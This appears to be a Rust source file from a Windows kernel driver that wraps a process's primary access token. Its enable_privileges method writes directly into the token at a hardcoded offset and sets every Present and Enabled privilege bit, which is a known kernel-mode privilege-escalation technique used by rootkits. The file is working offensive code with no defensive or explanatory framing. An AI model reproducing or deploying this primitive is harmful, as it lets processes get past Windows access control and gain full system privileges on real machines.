use crate::error::Error;
use crate::println;
use crate::process::Process;
use windows_kernel_sys::base::{PACCESS_TOKEN, PPROCESS_PRIVILEGES};
use windows_kernel_sys::ntoskrnl::{PsDereferencePrimaryToken, PsReferencePrimaryToken};

#[derive(Clone, Debug)]
pub struct Token {
    pub token: PACCESS_TOKEN,
}

unsafe impl Send for Token {}
unsafe impl Sync for Token {}

impl Token {
    pub fn as_ptr(&self) -> PACCESS_TOKEN {
        self.token
    }

    pub fn by_eprocess(process: &Process) -> Result<Self, Error> {
        let token = unsafe { PsReferencePrimaryToken(process.as_ptr()) };
        if token.is_null() {
            return  Err(Error::INVALID_HANDLE);
        }
        Ok(Self { token })
    }

    pub fn privilege_offset() -> isize {
        return 0x40 as isize;
    }

    pub fn enable_privileges(&self) -> Result<u32, Error> {

        println!("[*] Enable privilges");
        let privilege_offset: isize = Token::privilege_offset();
        let token_privs =
            unsafe { self.as_ptr().cast::<u8>().offset(privilege_offset) as PPROCESS_PRIVILEGES };

        unsafe {
            (*token_privs).Enabled = u64::to_le_bytes(0xffffffffff);
            (*token_privs).Present = u64::to_le_bytes(0xffffffffff);
        }

        Ok(0)
    }
}

impl Drop for Token {
    fn drop(&mut self) {
        unsafe {
            PsDereferencePrimaryToken(self.token as _);
        }
    }
}
